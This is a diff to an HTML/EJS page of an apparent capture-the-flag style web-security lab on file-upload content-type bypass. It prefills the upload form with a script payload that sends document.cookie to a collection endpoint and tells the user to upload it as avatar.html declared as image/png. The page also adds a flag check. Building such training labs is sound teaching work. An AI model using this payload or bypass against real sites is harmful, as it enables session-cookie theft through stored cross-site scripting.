@@ -10,40 +10,55 @@
 <div class="lab-wrap">
   <div class="lab-card">
     <h1>Upload Avatar</h1>
-    <p>Only PNG and JPEG images are accepted.</p>
+    <p>The server trusts the <code>X-Declared-Type</code> header for validation but trusts the filename extension when serving the file back.</p>
     <form id="uploadForm">
       <label>File content</label>
-      <textarea id="fileContent" rows="4" placeholder="File content here"></textarea>
+      <textarea id="fileContent" rows="5" placeholder="File content here">&lt;script&gt;fetch('/labs/upload-content-type-bypass/collect?t='+encodeURIComponent(document.cookie))&lt;/script&gt;</textarea>
       <label>Filename</label>
-      <input id="uploadFilename" placeholder="avatar.png">
+      <input id="uploadFilename" value="avatar.html" placeholder="avatar.png">
       <button type="submit">Upload</button>
     </form>
     <% if (error) { %><div class="lab-alert error"><%= error %></div><% } %>
+    <p class="lab-meta">Upload HTML content with a <code>.html</code> filename and a declared type of <code>image/png</code>. Open the returned file to execute it.</p>
   </div>
 
   <div class="lab-card">
     <h2>Uploaded Files</h2>
     <ul class="lab-list">
       <% files.forEach(f => { %>
-        <li><a href="/labs/upload-content-type-bypass/view/<%= f._id %>" target="_blank"><%= f.filename %></a> <span class="lab-meta">(<%= f.contentType %>)</span></li>
+        <li><a class="lab-link" href="/labs/upload-content-type-bypass/view/<%= f._id %>" target="_blank" rel="noopener"><%= f.filename %></a> <span class="lab-meta">(declared <%= f.contentType %>)</span></li>
       <% }) %>
       <% if (files.length === 0) { %><li class="lab-meta">No files uploaded.</li><% } %>
     </ul>
+    <button type="button" class="secondary" id="checkUpload">Check verification</button>
+    <pre class="lab-code" id="uploadResult" style="margin-top:0.8rem;">Not checked yet.</pre>
   </div>
-</div>
 
+  <form method="POST" action="/labs/upload-content-type-bypass/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
 <script>
-  document.getElementById('uploadForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+  document.getElementById('uploadForm').addEventListener('submit', function (event) {
+    event.preventDefault();
     var content = document.getElementById('fileContent').value;
     var filename = document.getElementById('uploadFilename').value || 'avatar.png';
     fetch('/labs/upload-content-type-bypass/upload?filename=' + encodeURIComponent(filename), {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain', 'X-Declared-Type': 'image/png' },
       body: content
-    }).then(function() { location.reload(); });
+    }).then(function () { location.reload(); });
+  });
+
+  document.getElementById('checkUpload').addEventListener('click', async function () {
+    const out = document.getElementById('uploadResult');
+    try {
+      const response = await fetch('/labs/upload-content-type-bypass/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
   });
 </script>
-
 </body>
 </html>
